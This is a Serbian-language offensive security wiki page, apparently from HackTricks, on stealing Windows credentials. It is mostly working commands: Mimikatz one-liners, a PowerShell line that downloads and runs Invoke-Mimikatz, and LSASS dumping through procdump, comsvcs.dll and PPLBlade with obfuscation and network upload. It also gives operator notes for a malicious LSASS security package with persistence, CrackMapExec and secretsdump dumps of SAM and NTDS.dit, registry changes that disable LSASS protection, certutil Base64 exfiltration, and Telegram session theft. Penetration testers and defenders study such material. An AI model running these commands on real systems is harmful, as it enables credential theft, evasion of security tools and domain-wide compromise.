# Krađa Windows kredencijala

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz kredencijali

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Pronađite druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saznajte više o nekim mogućim zaštitama akreditiva ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**

## Akreditivi uz Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da biste **pretražili lozinke i hash vrednosti** na žrtvi.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto je **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitiman Microsoft alat**, Defender ga ne detektuje.\
Ovaj alat možete koristiti za **dumpovanje lsass procesa**, **preuzimanje dumpa** i **lokalno izdvajanje** **pristupnih podataka** iz dumpa.

Možete koristiti i [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** upotrebu **procdump.exe za dump lsass.exe** kao **zlonamernu**, jer **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zato je **diskretnije** proslediti **PID** procesa lsass.exe kao **argument** za procdump, **umesto** imena **lsass.exe**.

### Dump lsass pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dump memorije procesa** u slučaju pada sistema. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, predviđenu za pokretanje pomoću `rundll32.exe`.\
Prva dva argumenta nisu bitna, ali je treći podeljen na tri komponente. Prvu komponentu čini ID procesa čiji dump treba napraviti, druga predstavlja lokaciju dump datoteke, a treća mora biti reč **full**. Druge opcije ne postoje.\
Nakon parsiranja ove tri komponente, DLL pravi dump datoteku i upisuje u nju memoriju navedenog procesa.\
**comsvcs.dll** se može koristiti za pravljenje dumpa procesa lsass, čime se izbegava potreba za otpremanjem i pokretanjem procdump-a. Ovaj metod je detaljno opisan na adresi [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Za izvršavanje se koristi sledeća komanda:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Pravljenje dump-a lsass-a pomoću Upravljača zadataka**

1. Kliknite desnim tasterom miša na traku zadataka i kliknite na Upravljač zadataka
2. Kliknite na Više detalja
3. Na kartici Procesi pronađite proces „Local Security Authority Process“
4. Kliknite desnim tasterom miša na proces „Local Security Authority Process“ i kliknite na „Create dump file“.

### Pravljenje dump-a lsass-a pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarna datoteka koju je potpisao Microsoft i koja je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.

Postojeći dump potpunog pada sistema ili njegova komprimovana kopija u dostupnoj korisničkoj fascikli može sadržati materijal sa akreditivima za offline analizu. Imena datoteka kao što su `MEMORY.DMP` i `MEMORY.7z` samo su smernice za proveru: utvrdite poreklo i pristup i nemojte pretpostavljati da sadrže upotrebljive ili aktuelne akreditive.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Offline izdvajanje akreditiva iz snimaka VM-a

Čitljiva rezervna kopija VM-a može da sadrži sačuvanu **sliku memorije gosta**, čak i bez pristupa pokrenutom gostu ili LSASS-u. Za VMware identifikujte metapodatke snimka `.vmsn` i pripadajući `.vmem`, ako postoji; nemojte ih mešati sa slikom diska `.vmdk`. `VMkatz` obrađuje ulazne podatke iz snimka ili direktorijuma VM-a i može da izdvoji [akreditive Windows sesija za prijavu](credentials-mimikatz.md), kao što su hash-evi i tiketi, iz memorije gosta. Može i da pregleda virtuelne diskove u potrazi za materijalom iz SAM/LSA. Preduslov je pristup datotekama rezervne kopije, a ne debug prava na aktivnom VM-u.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Primer u Checkpoint-u je izvukao NT hash **lokalnog** Administrator naloga iz snapshot-a samostalne VM mašine. Hash je omogućio autentifikaciju na domen tek nakon što je zasebno potvrđena ponovna upotreba lozinke; lokalni hash iz rezervne kopije nije sam po sebi domenски kredencijal. Na hostu sa ograničenom memorijom, VMkatz može da skenira i oslobađa stranice postepeno, ali kopiranje snapshot-a na veći host za analizu i dalje može biti bolji izbor.<sup>[[17]](#references)[[18]](#references)</sup>

## Dumping lsass pomoću PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dump-ovanje Protected Process-a koji podržava zamagljivanje dump-a memorije i njegov prenos na udaljene radne stanice bez zapisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Zamagljivanje dump datoteka memorije radi izbegavanja mehanizama Defender detekcije zasnovanih na potpisima
3. Otpremanje dump-a memorije pomoću RAW i SMB metoda otpremanja bez zapisivanja na disk (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon koristi dumper u tri faze, nazvan **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, tako da se EDR hookovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` u potrazi za placeholderom koji se sastoji od 32 mala slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita zlonamerni DLL kao novi Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, primenjuje XOR nad svakim bajtom sa `0x20` i mapira dekodirani blob u memoriju pre nego što prepusti izvršavanje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira logiku MiniDump koristeći **direct syscalls** razrešene pomoću hashiranih naziva API-ja (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Namenski export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje komprimovani LSASS dump u datoteku i zatvara handle kako bi eksfiltracija mogla da se obavi kasnije.

Napomene za operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 zamenjuje hard-kodirani placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami unapred upisati kako bi LSASS ponovo učitavao SSP pri svakom pokretanju sistema.
* Datoteke `%TEMP%\*.ddt` su komprimovani dumpovi. Dekompresujte ih lokalno, a zatim ih prosledite Mimikatz/Volatility alatima za izvlačenje kredencijala.
* Za pokretanje `lals.exe` potrebna su administratorska prava ili SeTcb prava kako bi `AddSecurityPackageA` uspeo; kada se poziv završi, LSASS neprimetno učitava lažni SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite stavku iz registra i restartujte LSASS (ponovnim pokretanjem sistema) ili je ostavite radi dugoročne perzistencije.

## CrackMapExec

### Dump SAM hash vrednosti

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA tajni

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit sa ciljnog DC-a

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dumpovanje istorije lozinki iz NTDS.dit-a sa ciljnog DC-a

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Krađa SAM i SYSTEM

Ove datoteke bi trebalo da se nalaze u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih samo kopirati na uobičajen način** jer su zaštićene.

### Iz registra

Najlakši način da ukradete te datoteke jeste da pribavite njihove kopije iz registra:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Preuzmite** te fajlove na svoju Kali mašinu i **izvucite hash vrednosti** pomoću:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Ovom uslugom možete kopirati zaštićene datoteke. Potrebna su vam administratorska prava.

#### Using vssadmin

Binarna datoteka vssadmin dostupna je samo u verzijama Windows Servera.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ali isto možete da uradite iz **Powershell**. Ovo je primer **kako da kopirate SAM datoteku** (korišćeni disk je „C:“, a datoteka se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo koje zaštićene datoteke:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da biste napravili kopiju datoteka SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory akreditivi - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce **Active Directory-ja** i sadrži ključne podatke o korisničkim objektima, grupama i njihovom članstvu. U njoj se čuvaju **hash vrednosti lozinki** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri primarne tabele:

- **Data Table**: U ovoj tabeli čuvaju se detalji o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što je članstvo u grupama.
- **SD Table**: Ovde se čuvaju **bezbednosni deskriptori** za svaki objekat, koji obezbeđuju bezbednost i kontrolu pristupa sačuvanim objektima.

Istraživanje Christoffera Anderssona na nivou baze podataka detaljnije opisuje ove tabele i njihovo ponašanje u različitim verzijama.<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za interakciju sa ovom datotekom, a koristi je i _lsass.exe_. Zbog toga se **deo** datoteke **NTDS.dit** može nalaziti **u memoriji procesa `lsass`** (verovatno su tu najskorije korišćeni podaci, zahvaljujući poboljšanju performansi pomoću **keša**).

#### Dešifrovanje hash vrednosti u NTDS.dit

Hash je šifrovan tri puta:

1. Dešifrujte Password Encryption Key (**PEK**) pomoću **BOOTKEY** i **RC4**.
2. Dešifrujte **hash** pomoću **PEK** i **RC4**.
3. Dešifrujte **hash** pomoću **DES**.

**PEK** ima **istu vrednost na svakom kontroleru domena**, ali je **šifrovan** unutar **NTDS.dit** pomoću **BOOTKEY-ja** specifičnog za taj kontroler domena, iz njegovog **SYSTEM** hive-a. Zato su za izdvajanje akreditiva potrebni i **NTDS.dit** i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Zasebna [tehnika preusmeravanja tabele kernel handle-ova](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) može da kopira već otvoren NTDS file object bez VSS-a, ali zahteva proizvoljnu kernel read/write primitivu na kontroleru domena.<sup>[[16]](#references)</sup>

### Kopiranje NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Možete koristiti i trik sa [**volume shadow copy**](#stealing-sam-and-system) da biste kopirali datoteku **ntds.dit**. Imajte na umu da će vam biti potrebna i kopija **SYSTEM datoteke** (ponovo, upotrebite trik [**da je izvezete iz registry-ja ili da koristite volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash vrednosti iz NTDS.dit**

Kada **nabavite** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate poput _secretsdump.py_ da biste **izdvojili hash vrednosti**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Možete ih takođe **automatski izdvojiti** koristeći važećeg korisnika sa administratorskim privilegijama domena:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Za **velike NTDS.dit datoteke** preporučuje se izdvajanje pomoću alata [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit datoteke u SQLite bazu podataka**

NTDS objekti mogu da se izdvoje u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne izdvajaju se samo tajne već i čitavi objekti i njihovi atributi, što omogućava dodatno izdvajanje informacija kada je sirova NTDS.dit datoteka već preuzeta.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive `SYSTEM` je opcionalan, ali omogućava dešifrovanje tajni (NT i LM hash-eva, dodatnih akreditiva kao što su lozinke u čistom tekstu, Kerberos ili trust ključevi i istorija NT i LM lozinki). Između ostalih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenske oznake poslednje prijave i promene lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstva, pouzdani domeni sa tipom, smerom i atributima trust odnosa...

## Lazagne

Preuzmite binarnu datoteku [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete da je koristite za izdvajanje akreditiva iz više softverskih programa.

```
lazagne.exe all
```

## Drugi alati za izvlačenje akreditiva iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izvlačenje akreditiva iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Izdvojite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** da biste izdvojili lozinke.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

Ink Dragon-ov FinalDraft RAT sadrži zadatak `DumpRDPHistory`, čije tehnike mogu biti korisne svakom red-teamer-u:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrijskih podataka u stilu DumpRDPHistory

* **Odredišta odlaznog RDP saobraćaja** – parsirajte svaki korisnički hive na putanji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki potključ čuva ime servera, `UsernameHint` i vremensku oznaku poslednjeg upisa. Logiku FinalDraft-a možete da reprodukujete pomoću PowerShell-a:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Dokazi o dolaznim RDP vezama** – pretražite evidenciju `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za Event IDs **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao računar:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Kada saznate koji se Domain Admin redovno povezuje, dump-ujte LSASS (pomoću LalsDumper/Mimikatz) dok njihova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavlja njihove verifikatore i tokene u LSASS-u, koji se zatim mogu ponovo upotrebiti preko SMB/WinRM-a za preuzimanje `NTDS.dit` ili uspostavljanje postojanosti na kontrolerima domena.

### Snižavanja nivoa registra na meti FinalDraft-a

Isti implant takođe menja nekoliko ključeva registra kako bi olakšao krađu akreditiva:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` onemogućava Restricted Admin za dolazni RDP; ne omogućava pass-the-hash kroz taj režim. Postavljanje vrednosti na `0` dozvoljava Restricted Admin na odredištu, ali klijent mora da zatraži `/RestrictedAdmin` ili da koristi smernicu koja zahteva Restricted Admin.<sup>[[14]](#references)</sup> Sam hash ne daje udaljena administratorska prava; pogledajte [preduslove za RDP autentifikaciju](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, pa lokalni administratori dobijaju neograničene tokene preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava administratoru DSRM-a da se prijavi dok je DC na mreži, čime napadači dobijaju još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, što alatima za dumpovanje kao što je LalsDumper znatno olakšava pristup memoriji.

## Akreditivi za konfiguraciju hMailServer-a (nakon kompromitovanja)

Proverite tačne konfiguracione datoteke `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, u skladu sa rasporedom instalacije. Čitljiva vrednost koja nije prazna u `[Security] AdministratorPassword=` predstavlja hash administratorske lozinke za hMailServer; ona nije dokaz da je u pitanju lozinka Windows Administrator naloga. Ako se taj akreditiv oporavi, za svaki prelazak na Windows nalog potrebno je nezavisno potvrditi ponovnu upotrebu lozinke i prava prijavljivanja.

Kod instalacija koje koriste SQL CE bazu podataka, zasebna vrednost `[Database] Password=` u INI datoteci štiti bazu podataka. U starijim instalacijama ova vrednost je šifrovana pomoću Blowfish algoritma sa statičkim ključem `THIS_KEY_IS_NOT_SECRET` i zamenom redosleda bajtova u 4-bajtnim rečima. Koristite heksadecimalni niz iz INI datoteke uz ovaj Python isečak:<sup>[[2]](#references)</sup>

Najpre potvrdite da trenutni nalog može da čita **i** INI datoteku **i** odgovarajuću SQL CE `.sdf` bazu podataka. Lozinka iz INI datoteke štiti bazu podataka; ona je zasebna od hash-eva lozinki mailbox naloga sačuvanih u njoj. Pregledajte ili nadogradite **kopiju** baze podataka koja je u upotrebi, nikada aktivnu datoteku.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Koristeći lozinku u otvorenom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provider i izvršite nadogradnju ako je potrebno pre pretraživanja hash vrednosti:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolona `accountpassword` koristi hMailServer format heša (hashcat režim `1421`). Probijena lozinka poštanskog sandučeta omogućava pivot ka Windows korisniku samo ako tu lozinku koristi i lokalni/nalog domena i ako taj nalog ima potrebna prava za udaljenu prijavu.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Neki alati prikupljaju **lozinke za prijavu u čistom tekstu** tako što presreću LSA callback za prijavu `LsaApLogonUserEx2`. Ideja je da se zakači ili omota callback paketa za autentifikaciju kako bi se akreditivi prikupili **tokom prijave** (pre heširanja), a zatim zapisali na disk ili vratili operateru. Ovo se obično implementira kao pomoćni alat koji se ubacuje u LSA ili se tamo registruje, a zatim beleži svaki uspešan događaj interaktivne/mrežne prijave, uključujući korisničko ime, domen i lozinku.<sup>[[1]](#references)</sup>

Operativne napomene:
- Potrebna su lokalna administratorska/SYSTEM prava da bi se pomoćni alat učitao u putanju za autentifikaciju.
- Prikupljeni akreditivi pojavljuju se tek kada dođe do prijave (interaktivne, RDP, servisne ili mrežne, u zavisnosti od hook-a).

## Sačuvani akreditivi za povezivanje u SSMS-u (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva informacije o sačuvanim vezama u korisničkoj datoteci `sqlstudio.bin`. Namenski alati za izvlačenje mogu da obrade datoteku i povrate sačuvane SQL akreditive. U ljuskama koje vraćaju samo izlaz komandi, datoteka se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Na strani operatera ponovo izgradite fajl i lokalno pokrenite dumper da biste povratili akreditive:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Krađa sesije pregledača i kolačića putem Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Krađa Telegram Desktop sesije `tdata`

Telegram Desktop čuva stanje autorizacije i naloga u svom direktorijumu **`tdata`**. Kopirana sesija može da se učita pomoću kompatibilnih alatki radi autentifikacije bez lozinke naloga, sve dok je ta autorizacija važeća; ako je omogućeno šifrovanje lokalnih podataka, stealeru je potrebna i pristupna šifra. Autentifikovana sesija zatim može da otkrije podatke o identitetu, metapodatke o dijalozima i članstvu, poruke i medije koji se mogu preuzeti.<sup>[[10]](#references)</sup>

### Otkrivanje i pribavljanje

Pretražite i instalirane i prenosive rasporede; nazivi paketa iz Microsoft Store-a se razlikuju, pa izlistajte direktorijume paketa koji sadrže `TelegramMessenge` i pregledajte njihovo podstablo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ako obična čitanja ne uspeju, a token procesa **već sadrži i omogućava** `SeBackupPrivilege`, pristup koji podržava režim rezervne kopije predstavlja alternativu; on ne pribavlja tu privilegiju niti podiže nivo privilegija procesa. `CreateFileW` sa `FILE_FLAG_BACKUP_SEMANTICS` može da zatraži semantiku rezervnog kopiranja/obnavljanja i zaobiđe bezbednosne provere datoteka kada su potrebne privilegije tokena prisutne, ali sama zastavica ne zaobilazi nekompatibilno zaključavanje deljenja.<sup>[[10]](#references)[[11]](#references)</sup>

Za datoteke koje su trenutno zaključane napravite/čitajte **Volume Shadow Copy**; za datoteke blokirane ACL-om, `robocopy /B` koristi režim rezervne kopije i zaobilazi ACL-ove datoteka i direktorijuma.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant koji vodi računa o potrošnji propusnog opsega može prvo da pošalje samo inventar putanja do fajlova, primi identifikator snimka stanja i putanje koje je C2 već sačuvao, a zatim otpremi samo fajlove koji nedostaju. Zato i mali inkrementalni prenosi nakon rekurzivnog popisivanja `tdata` i dalje mogu da ukazuju na uspešnu krađu sesije.<sup>[[10]](#references)</sup>

### Detekcija i ograničavanje posledica

Povežite rekurzivni pristup `tdata` od strane procesa koji nije Telegram sa aktiviranjem privilegije `SeBackupPrivilege`, otvaranjem fajlova uz backup semantiku, VSS aktivnošću ili podređenim procesom `robocopy.exe` koji koristi `/B`. Takođe tražite brzo popisivanje direktorijuma `%APPDATA%` i `%LOCALAPPDATA%\Packages`, praćeno odlaznim vezama istog procesa. Nakon kompromitovanja, koristite **Settings → Devices** (ili **Privacy & Security → Active Sessions**) da biste prekinuli neprepoznate sesije; samo uključivanje verifikacije u dva koraka ne opoziva već ukradenu autorizaciju.<sup>[[10]](#references)[[13]](#references)</sup>

## Krađa Passkeys / WebAuthn akreditiva iz Chrome-a na Windows-u

Ako se na Windows hostu koji koristi **Chrome + Google Password Manager synced passkeys** ostvari izvršavanje koda kao **victim user**, passkeys postaju zanimljiva meta za post-exploitation čak i **bez admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti

```text
